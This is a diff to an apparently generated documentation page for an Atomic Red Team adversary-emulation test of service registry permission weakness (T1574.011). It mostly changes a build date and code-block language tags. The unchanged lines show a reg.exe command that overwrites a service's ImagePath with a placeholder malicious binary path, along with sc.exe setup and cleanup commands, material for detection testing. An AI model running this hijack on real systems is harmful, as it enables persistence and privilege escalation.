@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1574.011"
 attack_technique_name: "Hijack Execution Flow: Services Registry Permissions Weakness"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "f38e9eea-e1d7-4ba6-b716-584791963827"
@@ -63,13 +63,13 @@ The service must exist (#{weak_service_name})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 sc.exe create #{weak_service_name} binpath= "#{weak_service_path}"
 ```
 
@@ -79,13 +79,13 @@ sc.exe create #{weak_service_name} binpath= "#{weak_service_path}"
 
 ### Command
 
-```commandprompt
+```cmd
 reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 sc.exe delete #{weak_service_name}
 ```
 
